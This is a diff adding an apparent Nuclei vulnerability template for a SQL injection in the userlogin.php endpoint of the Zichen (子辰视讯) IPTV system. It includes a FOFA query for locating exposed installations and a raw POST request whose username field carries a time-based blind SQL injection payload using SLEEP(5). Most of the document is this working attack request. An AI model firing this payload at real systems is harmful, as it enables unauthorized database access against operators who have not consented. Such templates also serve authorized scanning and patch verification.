@@ -1,0 +1,24 @@
+id: zichen-iptv-userlogin-sql
+
+info:
+  name: 子辰视讯IPTV系统 userlogin.php SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="xsiptvp"
+          子辰视讯IPTV系统为具备电信级全业务能力的视频平台，支持IGMP组播/HLS单播直播、4K超高清传输、时移回看、内外网点播及用户认证计费等功能。该系统userlogin.php接口未有效过滤用户输入的恶意SQL代码，可能导致攻击者通过构造特殊请求获取数据库敏感信息。
+  tags: 子辰视讯IPTV系统
+
+http:
+- raw:
+  - |-
+    POST /xsiptva/cniptv/userlogin.php HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Cache-Control: max-age=0
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+
+    username=admin' AND (SELECT 6707 FROM (SELECT(SLEEP(5)))mQbf) AND '1'='1&password=admin
